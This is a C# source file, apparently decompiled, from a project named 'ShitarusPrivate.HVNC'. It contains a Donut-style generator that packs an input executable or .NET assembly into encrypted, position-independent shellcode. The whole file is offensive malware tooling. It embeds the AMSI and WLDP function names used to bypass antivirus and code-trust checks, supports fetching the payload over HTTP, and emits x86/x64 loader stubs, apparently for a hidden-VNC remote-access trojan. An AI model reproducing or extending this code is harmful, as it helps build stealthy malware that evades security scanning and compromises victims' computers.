using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using ShitarusPrivate.HVNC.StubUtils.Donut.Structs;

namespace ShitarusPrivate.HVNC.StubUtils.Donut
{
    public class Generator
    {
        [CompilerGenerated]
        private static class __o__1
        {
            public static CallSite<Func<CallSite, object, DSModule>> __p__0;
        }

        [CompilerGenerated]
        private static class __o__2
        {
            public static CallSite<Func<CallSite, object, DSInstance>> __p__0;
        }

        public static int Donut_Create(ref DSConfig config)
        {
            DSFileInfo dSFileInfo = default(DSFileInfo);
            dSFileInfo.ver = new char[32];
            DSFileInfo fi = dSFileInfo;
            int num = Helper.ParseConfig(ref config, ref fi);
            if (num != 0)
            {
                return num;
            }
            num = CreateModule(ref config, ref fi);
            if (num != 0)
            {
                return num;
            }
            num = CreateInstance(ref config);
            if (num != 0)
            {
                return num;
            }
            num = GenerateOutput(ref config);
            if (num != 0)
            {
                return num;
            }
            return 0;
        }

        public static int CreateModule(ref DSConfig config, ref DSFileInfo fi)
        {
            Console.WriteLine("\nPayload options:");
            DSModule mod = new Helper().InitStruct("DSModule");
            mod.type = fi.type;
            if (mod.type == 1 || mod.type == 2)
            {
                if (config.domain[0] == '\0')
                {
                    Helper.Copy(config.domain, Helper.RandomString(8));
                }
                Console.WriteLine("\tDomain:\t" + Helper.String(config.domain));
                Helper.Unicode(mod.domain, Helper.String(config.domain));
                if (config.runtime[0] == '\0')
                {
                    config.runtime = fi.ver;
                }
                Console.WriteLine("\tRuntime:" + Helper.String(config.runtime));
                Helper.Unicode(mod.runtime, Helper.String(config.runtime));
            }
            if (config.param != null)
            {
                string[] array = Helper.String(config.param).Split(',', ';');
                for (int i = 0; i < array.Length; i++)
                {
                    Helper.Unicode(mod.p[i].param, array[i]);
                    mod.param_cnt++;
                }
                if (array[0] == "")
                {
                    mod.param_cnt = 0;
                }
            }
            mod.len = Convert.ToUInt32(new FileInfo(Helper.String(config.file)).Length);
            config.mod = mod;
            config.mod_len = Convert.ToUInt32(Marshal.SizeOf(typeof(DSModule))) + mod.len;
            return 0;
        }

        public unsafe static int CreateInstance(ref DSConfig config)
        {
            uint num = Convert.ToUInt32(Marshal.SizeOf(typeof(DSInstance)));
            DSInstance inst = new Helper().InitStruct("DSInstance");
            if (config.inst_type == 1)
            {
                num += Convert.ToUInt32(Marshal.SizeOf(typeof(DSModule)) + 32) + Convert.ToUInt32(config.mod_len);
            }
            byte[] array = Helper.RandomBytes(32);
            for (int i = 0; i < array.Length; i++)
            {
                if (i < 16)
                {
                    inst.key.ctr[i] = array[i];
                }
                else
                {
                    inst.key.mk[i - 16] = array[i];
                }
            }
            array = Helper.RandomBytes(32);
            for (int j = 0; j < array.Length; j++)
            {
                if (j < 16)
                {
                    inst.mod_key.ctr[j] = array[j];
                }
                else
                {
                    inst.mod_key.mk[j - 16] = array[j];
                }
            }
            Helper.Copy(inst.sig, Helper.RandomString(8));
            inst.iv = BitConverter.ToUInt64(Helper.RandomBytes(8), 0);
            Helper.APIImports(ref inst);
            if (config.mod_type == 1 || config.mod_type == 2)
            {
                inst.xIID_AppDomain = Constants.xIID_AppDomain;
                inst.xIID_ICLRMetaHost = Constants.xIID_ICLRMetaHost;
                inst.xCLSID_CLRMetaHost = Constants.xCLSID_CLRMetaHost;
                inst.xIID_ICLRRuntimeInfo = Constants.xIID_ICLRRuntimeInfo;
                inst.xIID_ICorRuntimeHost = Constants.xIID_ICorRuntimeHost;
                inst.xCLSID_CorRuntimeHost = Constants.xCLSID_CorRuntimeHost;
            }
            Helper.Copy(inst.amsi.s, "AMSI");
            Helper.Copy(inst.amsiInit, "AmsiInitialize");
            Helper.Copy(inst.amsiScanBuf, "AmsiScanBuffer");
            Helper.Copy(inst.amsiScanStr, "AmsiScanString");
            Helper.Copy(inst.clr, "CLR");
            Helper.Copy(inst.wldp, "WLDP");
            Helper.Copy(inst.wldpQuery, "WldpQueryDynamicCodeTrust");
            Helper.Copy(inst.wldpIsApproved, "WldpIsClassInApprovedList");
            inst.type = config.inst_type;
            if (inst.type == 2)
            {
                inst.http.url = new char[256];
                inst.http.req = new char[8];
                config.modname = Helper.RandomString(8).ToCharArray();
                Helper.Copy(inst.http.url, Helper.String(config.url) + Helper.String(config.modname));
                Helper.Copy(inst.http.req, "GET");
            }
            inst.mod_len = config.mod_len;
            inst.len = num;
            config.inst = inst;
            config.inst_len = num;
            inst.mac = Helper.Maru(Helper.String(inst.sig), ref inst);
            IntPtr intPtr = Marshal.AllocHGlobal(Convert.ToInt32(config.inst_len));
            Marshal.StructureToPtr(inst, intPtr, fDeleteOld: false);
            IntPtr intPtr2 = Marshal.AllocHGlobal(Convert.ToInt32(config.mod_len));
            Marshal.StructureToPtr(config.mod, intPtr2, fDeleteOld: false);
            int num2 = Marshal.OffsetOf(typeof(DSInstance), "api_cnt").ToInt32();
            IntPtr data = IntPtr.Add(intPtr, num2);
            int offset = Marshal.OffsetOf(typeof(DSInstance), "module").ToInt32();
            IntPtr pointer = IntPtr.Add(intPtr, offset);
            int offset2 = Marshal.OffsetOf(typeof(DSModule), "data").ToInt32();
            Buffer.MemoryCopy(intPtr2.ToPointer(), pointer.ToPointer(), Marshal.SizeOf(typeof(DSModule)), Marshal.SizeOf(typeof(DSModule)));
            if (inst.type == 1)
            {
                byte[] array2 = File.ReadAllBytes(Helper.String(config.file));
                IntPtr intPtr3 = Marshal.AllocHGlobal(array2.Length);
                Marshal.Copy(array2, 0, intPtr3, array2.Length);
                Buffer.MemoryCopy(intPtr3.ToPointer(), IntPtr.Add(pointer, offset2).ToPointer(), config.mod.len, config.mod.len);
                Marshal.FreeHGlobal(intPtr3);
            }
            Marshal.FreeHGlobal(intPtr2);
            Helper.Encrypt(inst.key.mk, inst.key.ctr, data, Convert.ToUInt32(inst.len - num2));
            int num3 = Shellcode(ref config, intPtr);
            if (num3 != 0)
            {
                return num3;
            }
            return 0;
        }

        public static int Shellcode(ref DSConfig config, IntPtr instptr)
        {
            if (config.arch == 1)
            {
                config.pic_len = Convert.ToUInt32(Constants.PAYLOAD_EXE_x86.Length + Convert.ToInt32(config.inst_len) + 32);
                config.pic = Marshal.AllocHGlobal(Marshal.SizeOf(config.pic_len));
            }
            else if (config.arch == 2)
            {
                config.pic_len = Convert.ToUInt32(Constants.PAYLOAD_EXE_x64.Length + Convert.ToInt32(config.inst_len) + 32);
                config.pic = Marshal.AllocHGlobal(Marshal.SizeOf(config.pic_len));
            }
            else if (config.arch == 3)
            {
                config.pic_len = Convert.ToUInt32(Constants.PAYLOAD_EXE_x86.Length + Constants.PAYLOAD_EXE_x64.Length + Convert.ToInt32(config.inst_len) + 32);
                config.pic = Marshal.AllocHGlobal(Convert.ToInt32(config.pic_len));
            }
            Helper.PUT_BYTE(232, ref config);
            Helper.PUT_WORD(BitConverter.GetBytes(config.inst_len), ref config);
            Helper.PUT_INST(instptr, Convert.ToInt32(config.inst_len), ref config);
            Helper.PUT_BYTE(89, ref config);
            if (config.arch == 1)
            {
                Helper.PUT_BYTE(90, ref config);
                Helper.PUT_BYTE(81, ref config);
                Helper.PUT_BYTE(82, ref config);
                Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x86, Constants.PAYLOAD_EXE_x86.Length, ref config);
            }
            else if (config.arch == 2)
            {
                Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x64, Constants.PAYLOAD_EXE_x64.Length, ref config);
            }
            else if (config.arch == 3)
            {
                Helper.PUT_BYTE(49, ref config);
                Helper.PUT_BYTE(192, ref config);
                Helper.PUT_BYTE(72, ref config);
                Helper.PUT_BYTE(15, ref config);
                Helper.PUT_BYTE(136, ref config);
                Helper.PUT_WORD(BitConverter.GetBytes(Constants.PAYLOAD_EXE_x64.Length), ref config);
                Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x64, Constants.PAYLOAD_EXE_x64.Length, ref config);
                Helper.PUT_BYTE(90, ref config);
                Helper.PUT_BYTE(81, ref config);
                Helper.PUT_BYTE(82, ref config);
                Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x86, Constants.PAYLOAD_EXE_x86.Length, ref config);
            }
            return 0;
        }

        public static int GenerateOutput(ref DSConfig config)
        {
            Helper.WriteOutput(ref config);
            return 0;
        }

        public static int CompileLoader()
        {
            return 0;
        }
    }
}
